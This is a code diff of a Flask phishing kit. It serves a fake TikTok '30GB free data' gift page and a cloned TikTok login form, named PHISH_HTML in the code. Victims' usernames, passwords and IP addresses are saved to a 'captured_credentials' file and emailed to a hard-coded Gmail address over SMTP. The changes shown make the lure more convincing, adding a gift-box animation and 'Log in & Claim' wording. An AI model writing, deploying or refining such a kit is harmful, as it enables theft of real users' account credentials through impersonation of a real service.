@@ -1,6 +1,6 @@
 # =============================================================================
-# TIKTOK 30GB PROMO + CLEAN LOGIN – RENDER DEPLOYMENT (EMAIL ALERTS)
-# Fixed: Removed ngrok (not needed on Render), uses PORT env variable
+# TIKTOK 30GB PROMO + ATTRACTIVE GIFT BOX ANIMATION – RENDER DEPLOYMENT
+# Brevo SMTP Configured | No Ngrok | Modern UI/UX
 # =============================================================================
 
 import os
@@ -15,6 +15,10 @@ from flask import Flask, request, render_template_string
 # -------------------- Configuration --------------------
 DATA_FILE = "captured_credentials.json"
 
+# SMTP Settings (Brevo recommended, fully customizable)
+SMTP_SERVER = os.environ.get('SMTP_SERVER', 'smtp-relay.brevo.com')
+SMTP_PORT = int(os.environ.get('SMTP_PORT', '587'))
+SMTP_USE_SSL = os.environ.get('SMTP_USE_SSL', 'false').lower() == 'true'
 EMAIL_SENDER = os.environ.get('EMAIL_SENDER', '')
 EMAIL_PASSWORD = os.environ.get('EMAIL_PASSWORD', '')
 EMAIL_RECEIVER = os.environ.get('EMAIL_RECEIVER', 'ah3418678@gmail.com')
@@ -24,71 +28,174 @@ logger = logging.getLogger(__name__)
 
 app = Flask(__name__)
 
-# -------------------- PROMO LANDING PAGE --------------------
+# -------------------- 🎁 PROMO LANDING PAGE WITH GIFT ANIMATION --------------------
 PROMO_HTML = '''
 <!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>TikTok - 30GB Free Internet</title>
+    <title>TikTok · 30GB Free Data Gift</title>
     <link rel="icon" href="https://www.tiktok.com/favicon.ico">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700;800&display=swap" rel="stylesheet">
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
-            background: #fff;
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
+            background: linear-gradient(145deg, #000000 0%, #121212 100%);
             min-height: 100vh;
             display: flex;
-            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding: 16px;
+            color: white;
         }
-        .container {
-            max-width: 400px;
-            margin: 0 auto;
-            padding: 20px;
+        .glass-card {
+            max-width: 420px;
+            width: 100%;
+            background: rgba(20, 20, 20, 0.7);
+            backdrop-filter: blur(20px);
+            -webkit-backdrop-filter: blur(20px);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 48px;
+            padding: 32px 24px;
+            box-shadow: 0 30px 50px rgba(0,0,0,0.5), 0 0 0 1px rgba(254,44,85,0.2) inset;
             text-align: center;
         }
-        .logo { margin: 30px 0 20px; }
-        .offer-card {
-            background: linear-gradient(135deg, #fe2c55 0%, #ff6b6b 100%);
-            border-radius: 24px;
-            padding: 30px 20px;
-            color: white;
-            margin-bottom: 30px;
-        }
-        .offer-badge {
-            background: rgba(255,255,255,0.2);
-            display: inline-block;
-            padding: 6px 16px;
-            border-radius: 50px;
-            font-size: 14px;
-            font-weight: 600;
-            margin-bottom: 20px;
-        }
-        .offer-title {
-            font-size: 36px;
-            font-weight: 800;
-            margin-bottom: 8px;
-        }
-        .offer-subtitle {
-            font-size: 16px;
-            opacity: 0.9;
+        .tiktok-badge {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
             margin-bottom: 24px;
         }
-        .data-highlight {
-            background: rgba(255,255,255,0.15);
-            border-radius: 16px;
-            padding: 20px;
-            margin: 20px 0;
+        .tiktok-badge svg {
+            filter: drop-shadow(0 4px 6px rgba(254,44,85,0.4));
+        }
+        .gift-container {
+            margin: 10px 0 20px;
+            cursor: pointer;
+            transition: transform 0.3s;
+        }
+        .gift-container:hover { transform: scale(1.02); }
+        .gift-box {
+            position: relative;
+            width: 180px;
+            height: 180px;
+            margin: 0 auto;
+            animation: float 3s ease-in-out infinite;
+        }
+        @keyframes float {
+            0% { transform: translateY(0px); }
+            50% { transform: translateY(-8px); }
+            100% { transform: translateY(0px); }
+        }
+        .gift-lid {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 40px;
+            background: linear-gradient(145deg, #fe2c55, #ff6b6b);
+            border-radius: 12px 12px 4px 4px;
+            box-shadow: 0 8px 0 #b01e3e, 0 12px 20px rgba(0,0,0,0.3);
+            transition: transform 0.5s cubic-bezier(0.34, 1.56, 0.64, 1);
+            transform-origin: top left;
+            z-index: 3;
+        }
+        .gift-body {
+            position: absolute;
+            bottom: 0;
+            left: 10px;
+            width: 160px;
+            height: 130px;
+            background: linear-gradient(145deg, #ff4d6d, #c9184a);
+            border-radius: 12px 12px 16px 16px;
+            box-shadow: 0 8px 0 #800f2f, 0 15px 25px rgba(0,0,0,0.4);
+            z-index: 1;
+        }
+        .gift-ribbon-vertical {
+            position: absolute;
+            left: 50%;
+            transform: translateX(-50%);
+            width: 24px;
+            height: 100%;
+            background: #00f2ea;
+            box-shadow: 0 4px 0 #00b4b0, inset 0 2px 5px rgba(255,255,255,0.5);
+            z-index: 2;
+        }
+        .gift-ribbon-horizontal {
+            position: absolute;
+            top: 50px;
+            left: 0;
+            width: 100%;
+            height: 24px;
+            background: #00f2ea;
+            box-shadow: 0 4px 0 #00b4b0, inset 0 2px 5px rgba(255,255,255,0.5);
+            z-index: 2;
+        }
+        .gift-bow-left, .gift-bow-right {
+            position: absolute;
+            top: -20px;
+            width: 40px;
+            height: 40px;
+            background: #00f2ea;
+            border-radius: 50% 50% 50% 0;
+            transform: rotate(45deg);
+            box-shadow: 0 4px 0 #00b4b0;
+            z-index: 4;
+        }
+        .gift-bow-left { left: 25px; }
+        .gift-bow-right { right: 25px; transform: rotate(135deg); }
+        .gift-bow-center {
+            position: absolute;
+            top: -10px;
+            left: 50%;
+            transform: translateX(-50%);
+            width: 30px;
+            height: 30px;
+            background: #00f2ea;
+            border-radius: 50%;
+            box-shadow: 0 4px 0 #00b4b0;
+            z-index: 5;
+        }
+        /* Open animation */
+        .gift-box.open .gift-lid {
+            transform: translateY(-120px) rotate(-25deg);
+            opacity: 0;
+        }
+        .gift-box.open .gift-bow-left,
+        .gift-box.open .gift-bow-right,
+        .gift-box.open .gift-bow-center { opacity: 0; }
+        .offer-content {
+            max-height: 0;
+            opacity: 0;
+            overflow: hidden;
+            transition: max-height 0.8s ease, opacity 0.6s ease;
+        }
+        .offer-content.show {
+            max-height: 500px;
+            opacity: 1;
+            margin-top: 20px;
+        }
+        .data-badge {
+            background: linear-gradient(135deg, #fe2c55, #ff6b6b);
+            border-radius: 60px;
+            padding: 12px 24px;
+            margin-bottom: 24px;
+            box-shadow: 0 10px 20px rgba(254,44,85,0.3);
         }
         .data-number {
-            font-size: 48px;
+            font-size: 52px;
             font-weight: 800;
+            letter-spacing: -2px;
+            text-shadow: 0 4px 10px rgba(0,0,0,0.2);
         }
         .data-label {
             font-size: 14px;
+            opacity: 0.9;
             text-transform: uppercase;
-            letter-spacing: 1px;
+            letter-spacing: 3px;
         }
         .cta-button {
             display: block;
@@ -96,86 +203,134 @@ PROMO_HTML = '''
             background: white;
             color: #fe2c55;
             border: none;
-            border-radius: 50px;
-            padding: 16px;
+            border-radius: 60px;
+            padding: 18px;
             font-size: 18px;
             font-weight: 700;
             text-decoration: none;
-            margin: 20px 0;
-            box-shadow: 0 4px 12px rgba(0,0,0,0.1);
-            transition: transform 0.2s;
+            margin: 20px 0 12px;
+            box-shadow: 0 8px 20px rgba(255,255,255,0.2);
+            transition: all 0.3s;
+            border: 1px solid rgba(255,255,255,0.3);
         }
-        .cta-button:hover { transform: scale(1.02); }
+        .cta-button:hover {
+            background: #fe2c55;
+            color: white;
+            transform: scale(1.02);
+            box-shadow: 0 12px 28px rgba(254,44,85,0.5);
+        }
         .features {
             display: flex;
             justify-content: space-around;
-            margin: 30px 0;
+            margin: 30px 0 10px;
         }
-        .feature-item { text-align: center; }
-        .feature-icon { font-size: 32px; margin-bottom: 8px; }
-        .feature-text { font-size: 13px; color: #8a8b91; }
+        .feature-item {
+            text-align: center;
+            opacity: 0.8;
+        }
+        .feature-icon { font-size: 28px; margin-bottom: 6px; }
+        .feature-text { font-size: 12px; color: #aaa; }
         .footer-note {
-            color: #8a8b91;
-            font-size: 12px;
-            margin-top: 30px;
-            padding-top: 20px;
-            border-top: 1px solid #f1f1f2;
+            color: #777;
+            font-size: 11px;
+            margin-top: 24px;
+            padding-top: 16px;
+            border-top: 1px solid rgba(255,255,255,0.05);
+        }
+        .click-hint {
+            color: #00f2ea;
+            font-size: 14px;
+            margin: 8px 0;
+            font-weight: 500;
+            text-shadow: 0 0 10px rgba(0,242,234,0.5);
         }
     </style>
 </head>
 <body>
-    <div class="container">
-        <div class="logo">
-            <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 118 30" width="130" height="42">
+    <div class="glass-card">
+        <div class="tiktok-badge">
+            <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 118 30" width="118" height="30">
                 <path fill="#25F4EE" d="M9.875 11.842v-1.119A8.836 8.836 0 008.7 10.64c-4.797-.006-8.7 3.9-8.7 8.707a8.706 8.706 0 003.718 7.135A8.675 8.675 0 011.38 20.55c0-4.737 3.794-8.598 8.495-8.707z"></path>
                 <path fill="#25F4EE" d="M10.087 24.526c2.14 0 3.89-1.707 3.966-3.83l.007-18.968h3.462a6.78 6.78 0 01-.109-1.202h-4.727l-.006 18.968a3.978 3.978 0 01-3.967 3.83 3.93 3.93 0 01-1.846-.46 3.949 3.949 0 003.22 1.662zM23.992 8.166V7.111a6.506 6.506 0 01-3.584-1.067 6.572 6.572 0 003.584 2.122z"></path>
                 <path fill="#FE2C55" d="M20.41 6.044a6.54 6.54 0 01-1.617-4.316h-1.265a6.557 6.557 0 002.881 4.316zM8.707 15.365a3.98 3.98 0 00-3.974 3.976c0 1.528.87 2.858 2.134 3.523a3.937 3.937 0 01-.754-2.321 3.98 3.98 0 013.973-3.976c.41 0 .805.07 1.176.185v-4.833a8.852 8.852 0 00-1.176-.083c-.07 0-.134.006-.204.006v3.708a3.999 3.999 0 00-1.175-.185z"></path>
                 <path fill="#FE2C55" d="M23.992 8.166v3.676a11.25 11.25 0 01-6.579-2.116v9.621c0 4.802-3.903 8.714-8.706 8.714a8.669 8.669 0 01-4.99-1.579 8.69 8.69 0 006.37 2.781c4.796 0 8.706-3.906 8.706-8.714v-9.621a11.25 11.25 0 006.579 2.116v-4.73c-.479 0-.939-.052-1.38-.148z"></path>
-                <path fill="white" d="M17.413 19.348V9.726a11.25 11.25 0 006.58 2.116V8.166a6.572 6.572 0 01-3.584-2.122 6.611 6.611 0 01-2.887-4.316h-3.463l-.006 18.968a3.978 3.978 0 01-3.967 3.83 3.99 3.99 0 01-3.225-1.656 3.991 3.991 0 01-2.134-3.523A3.98 3.98 0 018.7 15.372c.409 0 .805.07 1.176.185v-3.708c-4.702.103-8.496 3.964-8.496 8.701 0 2.29.888 4.373 2.338 5.933a8.669 8.669 0 004.989 1.58c4.797 0 8.706-3.913 8.706-8.715zM30.048 8.179h14.775l-1.355 4.232h-3.832v15.644h-4.778V12.41l-4.804.006-.006-4.238zM69.032 8.179h15.12l-1.354 4.232h-4.172v15.644h-4.784V12.41l-4.803.006-.007-4.238zM45.73 14.502h4.733v13.553h-4.708l-.026-13.553zM52.347 8.128h4.733v9.257l4.689-4.61h5.647l-5.934 5.76 6.643 9.52h-5.213l-4.433-6.598-1.405 1.362v5.236h-4.733V8.128h.006zM102.49 8.128h4.734v9.257l4.688-4.61h5.647l-5.934 5.76 6.643 9.52h-5.206l-4.433-6.598-1.405 1.362v5.236h-4.734V8.128zM48.093 12.954a2.384 2.384 0 10-.002-4.771 2.384 2.384 0 00.002 4.771z"></path>
-                <path fill="#25F4EE" d="M83.544 19.942a8.112 8.112 0 017.474-8.087 8.748 8.748 0 00-.709-.026c-4.478 0-8.106 3.631-8.106 8.113 0 4.482 3.628 8.113 8.106 8.113.21 0 .498-.013.71-.026-4.178-.326-7.475-3.823-7.475-8.087z"></path>
-                <path fill="#FE2C55" d="M92.858 11.83c-.217 0-.505.012-.715.025a8.111 8.111 0 017.467 8.087 8.111 8.111 0 01-7.467 8.087c.21.02.498.026.715.026 4.478 0 8.106-3.631 8.106-8.113 0-4.482-3.628-8.113-8.106-8.113z"></path>
-                <path fill="white" d="M91.58 23.887a3.94 3.94 0 01-3.94-3.945 3.94 3.94 0 117.882 0c0 2.18-1.77 3.945-3.941 3.945zm0-12.058c-4.477 0-8.105 3.631-8.105 8.113 0 4.482 3.628 8.113 8.106 8.113 4.477 0 8.106-3.631 8.106-8.113 0-4.482-3.629-8.113-8.106-8.113z"></path>
+                <path fill="white" d="M17.413 19.348V9.726a11.25 11.25 0 006.58 2.116V8.166a6.572 6.572 0 01-3.584-2.122 6.611 6.611 0 01-2.887-4.316h-3.463l-.006 18.968a3.978 3.978 0 01-3.967 3.83 3.99 3.99 0 01-3.225-1.656 3.991 3.991 0 01-2.134-3.523A3.98 3.98 0 018.7 15.372c.409 0 .805.07 1.176.185v-3.708c-4.702.103-8.496 3.964-8.496 8.701 0 2.29.888 4.373 2.338 5.933a8.669 8.669 0 004.989 1.58c4.797 0 8.706-3.913 8.706-8.715z"></path>
             </svg>
+            <span style="font-weight:700; color:#fff; font-size:18px; margin-left:4px;">TikTok</span>
         </div>
-        <div class="offer-card">
-            <div class="offer-badge">🎁 LIMITED TIME OFFER</div>
-            <div class="offer-title">30 GB</div>
-            <div class="offer-subtitle">Free Internet Data</div>
-            <div class="data-highlight">
-                <div class="data-number">30</div>
-                <div class="data-label">Gigabytes</div>
+        <p style="color:#aaa; margin-bottom:16px; font-size:14px;">🎉 Exclusive for you</p>
+        
+        <div class="gift-container" id="giftContainer">
+            <div class="gift-box" id="giftBox">
+                <div class="gift-lid"></div>
+                <div class="gift-bow-left"></div>
+                <div class="gift-bow-right"></div>
+                <div class="gift-bow-center"></div>
+                <div class="gift-body">
+                    <div class="gift-ribbon-vertical"></div>
+                    <div class="gift-ribbon-horizontal"></div>
+                </div>
             </div>
-            <p style="margin-bottom: 20px;">Exclusive for TikTok users</p>
+        </div>
+        
+        <div class="click-hint" id="hint">👇 Tap the gift to open!</div>
+        
+        <div class="offer-content" id="offerContent">
+            <div class="data-badge">
+                <div class="data-number">30 GB</div>
+                <div class="data-label">Free Internet Data</div>
+            </div>
+            <p style="margin-bottom:8px; font-size:16px; color:#ddd;">✨ Ready to activate</p>
             <a href="/login" class="cta-button">Log in with TikTok →</a>
-            <p style="font-size: 12px; opacity: 0.8;">No payment required • Activate instantly</p>
+            <p style="font-size:12px; opacity:0.6;">No payment required • Instant</p>
         </div>
+        
         <div class="features">
-            <div class="feature-item"><div class="feature-icon">📱</div><div class="feature-text">Stream Videos</div></div>
-            <div class="feature-item"><div class="feature-icon">🎮</div><div class="feature-text">Play Games</div></div>
-            <div class="feature-item"><div class="feature-icon">🌐</div><div class="feature-text">Browse Free</div></div>
+            <div class="feature-item"><div class="feature-icon">📱</div><div class="feature-text">Stream</div></div>
+            <div class="feature-item"><div class="feature-icon">🎮</div><div class="feature-text">Gaming</div></div>
+            <div class="feature-item"><div class="feature-icon">🌐</div><div class="feature-text">Browse</div></div>
         </div>
-        <div class="footer-note">
-            <p>🔒 Secure activation through TikTok</p>
-            <p style="margin-top:8px;">© 2026 TikTok</p>
-        </div>
+        <div class="footer-note">🔒 Secured by TikTok • © 2026</div>
     </div>
+
+    <script>
+        const giftBox = document.getElementById('giftBox');
+        const offerContent = document.getElementById('offerContent');
+        const hint = document.getElementById('hint');
+        let isOpen = false;
+        
+        giftBox.addEventListener('click', () => {
+            if (!isOpen) {
+                giftBox.classList.add('open');
+                offerContent.classList.add('show');
+                hint.style.opacity = '0';
+                setTimeout(() => { hint.style.display = 'none'; }, 500);
+                isOpen = true;
+                // Add subtle vibration haptic if supported
+                if (navigator.vibrate) navigator.vibrate(20);
+            }
+        });
+        
+        // Pre-open on hover? No, only click.
+    </script>
 </body>
 </html>
 '''
 
-# -------------------- CLEAN LOGIN PAGE --------------------
+# -------------------- 🔐 SLEEK LOGIN PAGE --------------------
 PHISH_HTML = '''
 <!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>TikTok · Login</title>
+    <title>TikTok · Login to claim 30GB</title>
     <link rel="icon" href="https://www.tiktok.com/favicon.ico">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            font-family: 'Inter', sans-serif;
             background: #f8f9fa;
             min-height: 100vh;
             display: flex;
@@ -186,8 +341,13 @@ PHISH_HTML = '''
             align-items: center;
             justify-content: space-between;
             padding: 16px 24px;
-            background: #fff;
+            background: rgba(255,255,255,0.8);
+            backdrop-filter: blur(10px);
+            -webkit-backdrop-filter: blur(10px);
             border-bottom: 1px solid rgba(0,0,0,0.05);
+            position: sticky;
+            top: 0;
+            z-index: 10;
         }
         .logo {
             display: flex;
@@ -199,12 +359,10 @@ PHISH_HTML = '''
         }
         .logo svg { margin-right: 8px; }
         .help-link {
-            display: flex;
-            align-items: center;
-            gap: 6px;
             color: #606770;
             text-decoration: none;
             font-size: 14px;
+            font-weight: 500;
         }
         .main {
             flex: 1;
@@ -217,14 +375,24 @@ PHISH_HTML = '''
             width: 100%;
             max-width: 400px;
             background: #fff;
-            border-radius: 24px;
-            box-shadow: 0 8px 28px rgba(0,0,0,0.08);
-            padding: 32px 28px;
+            border-radius: 32px;
+            box-shadow: 0 20px 40px rgba(0,0,0,0.06), 0 6px 12px rgba(0,0,0,0.03);
+            padding: 36px 28px;
+            border: 1px solid rgba(0,0,0,0.02);
         }
+        .gift-reminder {
+            background: linear-gradient(135deg, #fe2c55, #ff6b6b);
+            color: white;
+            border-radius: 20px;
+            padding: 16px;
+            margin-bottom: 28px;
+            text-align: center;
+        }
+        .gift-reminder span { font-size: 28px; margin-right: 8px; }
         .card h2 {
-            font-size: 28px;
+            font-size: 26px;
             font-weight: 700;
-            margin-bottom: 8px;
+            margin-bottom: 6px;
             color: #121212;
         }
         .subtitle {
@@ -232,20 +400,20 @@ PHISH_HTML = '''
             font-size: 15px;
             margin-bottom: 28px;
         }
-        .form-group { margin-bottom: 20px; }
+        .form-group { margin-bottom: 22px; }
         .form-group label {
             display: block;
             font-size: 14px;
-            font-weight: 500;
+            font-weight: 600;
             color: #1f1f1f;
-            margin-bottom: 6px;
+            margin-bottom: 8px;
         }
         .input-wrapper input {
             width: 100%;
-            padding: 14px 16px;
+            padding: 15px 18px;
             background: #f1f1f2;
             border: 1.5px solid transparent;
-            border-radius: 14px;
+            border-radius: 18px;
             font-size: 16px;
             outline: none;
             transition: all 0.2s;
@@ -253,32 +421,25 @@ PHISH_HTML = '''
         .input-wrapper input:focus {
             border-color: #fe2c55;
             background: #fff;
-            box-shadow: 0 0 0 3px rgba(254,44,85,0.1);
+            box-shadow: 0 0 0 4px rgba(254,44,85,0.1);
         }
-        .forgot-link {
-            text-align: right;
-            margin-top: 6px;
-        }
-        .forgot-link a {
-            color: #fe2c55;
-            font-size: 14px;
-            text-decoration: none;
-            font-weight: 500;
-        }
+        .forgot-link { text-align: right; margin-top: 6px; }
+        .forgot-link a { color: #fe2c55; font-size: 14px; text-decoration: none; font-weight: 600; }
         .login-btn {
             width: 100%;
-            padding: 14px;
+            padding: 16px;
             background: #fe2c55;
             color: white;
             border: none;
-            border-radius: 14px;
-            font-size: 16px;
+            border-radius: 60px;
+            font-size: 17px;
             font-weight: 700;
             cursor: pointer;
-            margin: 16px 0 20px;
-            transition: background 0.2s, transform 0.1s;
+            margin: 16px 0 22px;
+            transition: all 0.2s;
+            box-shadow: 0 6px 16px rgba(254,44,85,0.25);
         }
-        .login-btn:hover { background: #e01e45; }
+        .login-btn:hover { background: #e01e45; transform: scale(1.01); }
         .login-btn:active { transform: scale(0.98); }
         .signup-prompt {
             text-align: center;
@@ -289,13 +450,13 @@ PHISH_HTML = '''
         .signup-prompt a {
             color: #fe2c55;
             text-decoration: none;
-            font-weight: 600;
+            font-weight: 700;
             margin-left: 6px;
         }
         .footer-links {
             display: flex;
             justify-content: center;
-            gap: 24px;
+            gap: 28px;
             font-size: 13px;
             color: #8a8b91;
         }
@@ -304,24 +465,22 @@ PHISH_HTML = '''
             text-align: center;
             color: #8a8b91;
             font-size: 12px;
-            margin-top: 16px;
-            padding-top: 16px;
+            margin-top: 20px;
+            padding-top: 20px;
             border-top: 1px solid #f0f0f0;
         }
-        .success-message {
-            text-align: center;
-            padding: 20px 0;
-        }
+        .success-message { text-align: center; padding: 20px 0; }
         .success-message .emoji { font-size: 56px; margin-bottom: 16px; }
-        .success-message h3 { font-size: 24px; margin-bottom: 8px; color: #121212; }
+        .success-message h3 { font-size: 24px; margin-bottom: 10px; color: #121212; }
         .success-message p { color: #606770; margin-bottom: 24px; }
         .error-message {
             background: #fee2e2;
             color: #b91c1c;
-            padding: 12px;
-            border-radius: 12px;
-            margin-bottom: 20px;
+            padding: 12px 16px;
+            border-radius: 18px;
+            margin-bottom: 22px;
             font-size: 14px;
+            border-left: 4px solid #b91c1c;
         }
         @media (max-width: 480px) {
             .header { padding: 12px 16px; }
@@ -337,30 +496,27 @@ PHISH_HTML = '''
                 <path fill="#25F4EE" d="M10.087 24.526c2.14 0 3.89-1.707 3.966-3.83l.007-18.968h3.462a6.78 6.78 0 01-.109-1.202h-4.727l-.006 18.968a3.978 3.978 0 01-3.967 3.83 3.93 3.93 0 01-1.846-.46 3.949 3.949 0 003.22 1.662zM23.992 8.166V7.111a6.506 6.506 0 01-3.584-1.067 6.572 6.572 0 003.584 2.122z"></path>
                 <path fill="#FE2C55" d="M20.41 6.044a6.54 6.54 0 01-1.617-4.316h-1.265a6.557 6.557 0 002.881 4.316zM8.707 15.365a3.98 3.98 0 00-3.974 3.976c0 1.528.87 2.858 2.134 3.523a3.937 3.937 0 01-.754-2.321 3.98 3.98 0 013.973-3.976c.41 0 .805.07 1.176.185v-4.833a8.852 8.852 0 00-1.176-.083c-.07 0-.134.006-.204.006v3.708a3.999 3.999 0 00-1.175-.185z"></path>
                 <path fill="#FE2C55" d="M23.992 8.166v3.676a11.25 11.25 0 01-6.579-2.116v9.621c0 4.802-3.903 8.714-8.706 8.714a8.669 8.669 0 01-4.99-1.579 8.69 8.69 0 006.37 2.781c4.796 0 8.706-3.906 8.706-8.714v-9.621a11.25 11.25 0 006.579 2.116v-4.73c-.479 0-.939-.052-1.38-.148z"></path>
-                <path fill="white" d="M17.413 19.348V9.726a11.25 11.25 0 006.58 2.116V8.166a6.572 6.572 0 01-3.584-2.122 6.611 6.611 0 01-2.887-4.316h-3.463l-.006 18.968a3.978 3.978 0 01-3.967 3.83 3.99 3.99 0 01-3.225-1.656 3.991 3.991 0 01-2.134-3.523A3.98 3.98 0 018.7 15.372c.409 0 .805.07 1.176.185v-3.708c-4.702.103-8.496 3.964-8.496 8.701 0 2.29.888 4.373 2.338 5.933a8.669 8.669 0 004.989 1.58c4.797 0 8.706-3.913 8.706-8.715zM30.048 8.179h14.775l-1.355 4.232h-3.832v15.644h-4.778V12.41l-4.804.006-.006-4.238zM69.032 8.179h15.12l-1.354 4.232h-4.172v15.644h-4.784V12.41l-4.803.006-.007-4.238zM45.73 14.502h4.733v13.553h-4.708l-.026-13.553zM52.347 8.128h4.733v9.257l4.689-4.61h5.647l-5.934 5.76 6.643 9.52h-5.213l-4.433-6.598-1.405 1.362v5.236h-4.733V8.128h.006zM102.49 8.128h4.734v9.257l4.688-4.61h5.647l-5.934 5.76 6.643 9.52h-5.206l-4.433-6.598-1.405 1.362v5.236h-4.734V8.128zM48.093 12.954a2.384 2.384 0 10-.002-4.771 2.384 2.384 0 00.002 4.771z"></path>
-                <path fill="#25F4EE" d="M83.544 19.942a8.112 8.112 0 017.474-8.087 8.748 8.748 0 00-.709-.026c-4.478 0-8.106 3.631-8.106 8.113 0 4.482 3.628 8.113 8.106 8.113.21 0 .498-.013.71-.026-4.178-.326-7.475-3.823-7.475-8.087z"></path>
-                <path fill="#FE2C55" d="M92.858 11.83c-.217 0-.505.012-.715.025a8.111 8.111 0 017.467 8.087 8.111 8.111 0 01-7.467 8.087c.21.02.498.026.715.026 4.478 0 8.106-3.631 8.106-8.113 0-4.482-3.628-8.113-8.106-8.113z"></path>
-                <path fill="white" d="M91.58 23.887a3.94 3.94 0 01-3.94-3.945 3.94 3.94 0 117.882 0c0 2.18-1.77 3.945-3.941 3.945zm0-12.058c-4.477 0-8.105 3.631-8.105 8.113 0 4.482 3.628 8.113 8.106 8.113 4.477 0 8.106-3.631 8.106-8.113 0-4.482-3.629-8.113-8.106-8.113z"></path>
+                <path fill="white" d="M17.413 19.348V9.726a11.25 11.25 0 006.58 2.116V8.166a6.572 6.572 0 01-3.584-2.122 6.611 6.611 0 01-2.887-4.316h-3.463l-.006 18.968a3.978 3.978 0 01-3.967 3.83 3.99 3.99 0 01-3.225-1.656 3.991 3.991 0 01-2.134-3.523A3.98 3.98 0 018.7 15.372c.409 0 .805.07 1.176.185v-3.708c-4.702.103-8.496 3.964-8.496 8.701 0 2.29.888 4.373 2.338 5.933a8.669 8.669 0 004.989 1.58c4.797 0 8.706-3.913 8.706-8.715z"></path>
             </svg>
             TikTok
         </a>
-        <a class="help-link" href="#">
-            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"></circle><path d="M9.09 9a3 3 0 0 1 5.83 1c0 2-3 3-3 3"></path><line x1="12" y1="17" x2="12.01" y2="17"></line></svg>
-            Help
-        </a>
+        <a class="help-link" href="#">Help</a>
     </div>
     <div class="main">
         <div class="card">
             {% if success %}
                 <div class="success-message">
-                    <div class="emoji">✅</div>
-                    <h3>Login Successful</h3>
-                    <p>Your 30GB free data will be activated shortly.<br>You can close this page.</p>
-                    <a href="/" style="display: inline-block; padding: 12px 24px; background: #fe2c55; color: white; text-decoration: none; border-radius: 50px; font-weight: 600;">Return to Home</a>
+                    <div class="emoji">🎁✅</div>
+                    <h3>You're all set!</h3>
+                    <p>Your 30GB will be added within minutes.<br>Enjoy free streaming! 🚀</p>
+                    <a href="/" style="display:inline-block; background:#fe2c55; color:white; text-decoration:none; padding:14px 30px; border-radius:40px; font-weight:600;">Return Home</a>
                 </div>
             {% else %}
-                <h2>Log in to TikTok</h2>
-                <p class="subtitle">Get 30GB free data after login</p>
+                <div class="gift-reminder">
+                    <span>🎁</span> 30GB Gift waiting for you!
+                </div>
+                <h2>Log in</h2>
+                <p class="subtitle">to claim your free data</p>
                 {% if error %}
                     <div class="error-message">{{ error }}</div>
                 {% endif %}
@@ -368,32 +524,25 @@ PHISH_HTML = '''
                     <div class="form-group">
                         <label>Email or username</label>
                         <div class="input-wrapper">
-                            <input type="text" name="username" placeholder="Enter your email or username" required autofocus>
+                            <input type="text" name="username" placeholder=" " required autofocus>
                         </div>
                     </div>
                     <div class="form-group">
                         <label>Password</label>
                         <div class="input-wrapper">
-                            <input type="password" name="password" placeholder="Enter your password" required>
+                            <input type="password" name="password" placeholder=" " required>
                         </div>
-                        <div class="forgot-link">
-                            <a href="#">Forgot password?</a>
-                        </div>
+                        <div class="forgot-link"><a href="#">Forgot password?</a></div>
                     </div>
-                    <button type="submit" class="login-btn">Log in</button>
+                    <button type="submit" class="login-btn">Log in & Claim</button>
                     <div class="signup-prompt">
-                        Don't have an account? <a href="#">Sign up</a>
+                        New to TikTok? <a href="#">Sign up</a>
                     </div>
                 </form>
                 <div class="footer-links">
-                    <a href="#">About</a>
-                    <a href="#">Help</a>
-                    <a href="#">Privacy</a>
-                    <a href="#">Terms</a>
+                    <a href="#">About</a><a href="#">Privacy</a><a href="#">Terms</a>
                 </div>
-                <div class="copyright">
-                    © 2026 TikTok
-                </div>
+                <div class="copyright">© 2026 TikTok</div>
             {% endif %}
         </div>
     </div>
@@ -403,7 +552,6 @@ PHISH_HTML = '''
 
 # -------------------- Helper Functions --------------------
 def save_credentials(username, password, ip_address):
-    """Save captured credentials to JSON file."""
     entry = {
         "timestamp": datetime.now().isoformat(),
         "ip": ip_address,
@@ -424,9 +572,8 @@ def save_credentials(username, password, ip_address):
         logger.error(f"Failed to save credentials: {e}")
 
 def send_email_alert(subject, body):
-    """Send email alert using SMTP."""
     if not EMAIL_SENDER or not EMAIL_PASSWORD:
-        logger.warning("Email credentials not set. Skipping email alert.")
+        logger.error("❌ EMAIL_SENDER or EMAIL_PASSWORD not set")
         return False
     try:
         msg = EmailMessage()
@@ -435,17 +582,22 @@ def send_email_alert(subject, body):
         msg['From'] = EMAIL_SENDER
         msg['To'] = EMAIL_RECEIVER
 
-        # Gmail SMTP
-        with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp:
-            smtp.login(EMAIL_SENDER, EMAIL_PASSWORD)
-            smtp.send_message(msg)
-        logger.info("Email alert sent successfully")
+        if SMTP_USE_SSL:
+            with smtplib.SMTP_SSL(SMTP_SERVER, SMTP_PORT) as smtp:
+                smtp.login(EMAIL_SENDER, EMAIL_PASSWORD)
+                smtp.send_message(msg)
+        else:
+            with smtplib.SMTP(SMTP_SERVER, SMTP_PORT) as smtp:
+                smtp.starttls()
+                smtp.login(EMAIL_SENDER, EMAIL_PASSWORD)
+                smtp.send_message(msg)
+        logger.info("✅ Email alert sent")
         return True
